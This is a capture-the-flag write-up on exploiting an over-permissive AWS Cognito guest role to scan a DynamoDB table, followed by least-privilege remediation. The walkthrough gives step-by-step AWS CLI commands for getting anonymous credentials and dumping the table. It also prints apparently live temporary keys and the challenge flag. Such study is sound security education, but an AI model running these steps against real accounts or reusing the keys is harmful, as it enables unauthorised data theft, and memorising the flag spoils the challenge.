# Writeup: Complimentary (Byte Lotus Wellness)

|**Challenge Attribute**|**Details**|
|---|---|
|**Category**|Cloud / AWS Security|
|**Difficulty**|Easy|
|**Primary Vulnerability**|AWS Cognito Unauthenticated Identity Pool Misconfiguration|
|**Impact**|Unauthorized Data Exfiltration / Full DynamoDB Table Exposure|
|**Flag**|`THM{fr33_app_fr33_d4t4!}`|

## Executive Summary

The **Byte Lotus Wellness** web application provides a "frictionless" guest experience with no login screen. To maintain guest session state without requiring traditional authentication, the application uses **AWS Cognito Identity Pools** to automatically issue temporary AWS credentials to every browser session.

While using unauthenticated guest roles is a valid architectural pattern, the underlying IAM role attached to guest users violated the **Principle of Least Privilege**. Instead of restricting guests to read/write only their own record, the assigned IAM policy allowed unauthenticated users to perform a global `dynamodb:Scan` across the entire guest database.

## Technical Concept: How AWS Cognito Identity Pools Work

Understanding the difference between **Cognito User Pools** and **Cognito Identity Pools** is crucial for this challenge:

- **Cognito User Pools (Authentication):** A user directory that handles sign-up, sign-in, and password management (issues JWTs like ID tokens and Access tokens).
    
- **Cognito Identity Pools (Authorization):** A service that exchanges identity tokens—or requests from completely unauthenticated guests—for **temporary AWS IAM credentials** (Access Key, Secret Key, and Session Token).
    

```
[ Unauthenticated Guest ] 
           │
           │  1. Request Identity ID (get-id)
           ▼
[ AWS Cognito Identity Pool ] ──────► Returns Identity ID
           │
           │  2. Request IAM Credentials (get-credentials-for-identity)
           ▼
[ AWS STS / IAM ] ─────────────────► Returns Temporary AWS Credentials (ASIA...)
           │
           │  3. Execute AWS API Commands (dynamodb:Scan)
           ▼
[ AWS DynamoDB Table ]
```

### The Authentication & Authorization Flow

1. **Client Request:** When a user hits the site, the browser JavaScript SDK contacts Cognito using a hardcoded `IdentityPoolId`.
    
2. **Identity Assignment:** Cognito assigns an anonymous `IdentityId` to the visitor.
    
3. **Role Assumption:** Cognito assumes an **Unauthenticated IAM Role** pre-configured by the cloud administrator.
    
4. **Credential Issue:** AWS Security Token Service (STS) returns temporary credentials starting with `ASIA...`.
    
5. **Resource Access:** The browser uses these credentials to talk directly to AWS services (in this case, Amazon DynamoDB).
    

## Step-by-Step Exploitation Walkthrough

### Phase 1: Client-Side Reconnaissance

Inspecting the HTML source of the landing page showed that it loaded an external script named `app.js`:

Bash

```
curl -s http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/app.js
```

**Extracted Configuration Parameters:**

- **Cognito Identity Pool ID:** `us-east-1:836c0949-292d-485b-b532-52d5ca7bb688`
    
- **Target DynamoDB Table:** `complimentary-GuestWellnessProfiles`
    
- **AWS Region:** `us-east-1`
    

### Phase 2: Interacting with Cognito via AWS CLI

#### 1. Requesting an Anonymous Identity ID

Using the public `IdentityPoolId`, we called the `get-id` endpoint:

Bash

```
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" \
  --region us-east-1
```

- **Response:** Received `IdentityId`: `us-east-1:4d571309-b0e6-cad6-3bd3-c484458fc64f`
    

#### 2. Exchanging the Identity ID for IAM Credentials

Next, we passed our `IdentityId` to retrieve temporary session keys:

Bash

```
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:4d571309-b0e6-cad6-3bd3-c484458fc64f" \
  --region us-east-1
```

- **Response:** Returned temporary credentials (`AccessKeyId`, `SecretKey`, `SessionToken`).
    

### Phase 3: Session Hijacking & Database Scanning

We exported the temporary credentials into our active shell session:

Bash

```
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYKYCX7ZK3"
export AWS_SECRET_ACCESS_KEY="Q+829KM+FWpGHWrq1gCYgc51l3nw10snUJFnf5MU"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjELn..."
export AWS_DEFAULT_REGION="us-east-1"
```

With active AWS credentials set, we attempted to query the target DynamoDB table. Because the IAM role lacked access restrictions, a global table scan succeeded:

Bash

```
aws dynamodb scan \
  --table-name "complimentary-GuestWellnessProfiles" \
  --region us-east-1
```

Among the retrieved guest profiles was `guest-vip-042`, which contained the flag inside its `notes` attribute:

JSON

```
{
  "guest_id": { "S": "guest-vip-042" },
  "name": { "S": "VIP Guest" },
  "notes": {
    "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"
  }
}
```

## Defensive Remediation

### The Vulnerable IAM Policy (What was misconfigured)

The unauthenticated role likely used an overly broad policy similar to this:

JSON

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "dynamodb:GetItem",
        "dynamodb:Scan"
      ],
      "Resource": "arn:aws:dynamodb:us-east-1:*:table/complimentary-GuestWellnessProfiles"
    }
  ]
}
```

### Secure Policy Design (Fine-Grained Access Control)

To allow unauthenticated guest access securely, the policy must use **DynamoDB Fine-Grained Access Control (FGAC)** with the `dynamodb:LeadingKeys` condition key.

This ensures users can only read or modify items where the Primary Key (`guest_id`) matches their exact Cognito Identity ID:

JSON

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "dynamodb:GetItem",
        "dynamodb:PutItem"
      ],
      "Resource": "arn:aws:dynamodb:us-east-1:123456789012:table/complimentary-GuestWellnessProfiles",
      "Condition": {
        "ForAllValues:StringEquals": {
          "dynamodb:LeadingKeys": [
            "${cognito-identity.amazonaws.com:sub}"
          ]
        }
      }
    }
  ]
}
```

> **Security Key Takeaways:**
> 
> 1. `dynamodb:Scan` should almost **never** be granted to unauthenticated roles.
>     
> 2. Hardcoded Identity Pool IDs are public by design, so security must be enforced on the IAM role attached to the pool, not by attempting to hide the ID.

---

_Solved and documented by Obito Uchiha — Team AKATSUKI_